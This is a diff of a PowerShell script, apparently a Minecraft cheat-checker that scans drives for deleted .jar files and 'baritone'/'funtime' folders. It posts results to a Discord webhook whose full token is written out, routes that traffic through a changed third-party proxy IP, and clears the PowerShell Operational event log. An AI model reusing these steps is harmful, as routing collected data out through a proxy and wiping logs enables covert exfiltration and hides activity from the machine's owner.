@@ -32,7 +32,7 @@ function Send-Webhook-Data {
     param($Payload)
 
     $webhookUrl = "https://discord.com/api/webhooks/1430163604883243069/o8pNeSj-qVF5ROqFNqoac6kK3BsVgC7RvLU2KvczeNZfS03108GQM5kapCV4OE2YukRm"
-    $proxy = "http://20.27.15.111:8561"
+    $proxy = "http://45.4.202.170:999"
 
     $body = $Payload | ConvertTo-Json -Depth 5
 
@@ -124,6 +124,32 @@ $scriptBlock = {
         foreach($i in $commandLine -split '\n') {
             if($needNext -eq 1) {
                 Write-Host 'Deleted .jar in ' $lastTime ' : ' ($i -split ' : ')[1].trim() -ForegroundColor Red
+                $needNext = 0
+            }
+
+            if($i.Contains('FILE_DELETE')) { 
+                $needNext = 1
+            }
+            if($i.Contains('Timestamp')) {
+                $lastTime = ($i -split ' : ')[1].trim()
+            }
+        }
+    }
+
+
+    $commandLine = @()
+
+    foreach($i in $driveLetters) {
+        $commandLine += ./3.exe read $i -f '*funtime*' --dir-only
+    }
+
+    $needNext = 0
+    $lastTime = ''
+
+    if($commandLine) {
+        foreach($i in $commandLine -split '\n') {
+            if($needNext -eq 1) {
+                Write-Host 'Deleted baritone in ' $lastTime ' : ' ($i -split ' : ')[1].trim() -ForegroundColor Magenta
                 $needNext = 0
             }
 
@@ -569,6 +595,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
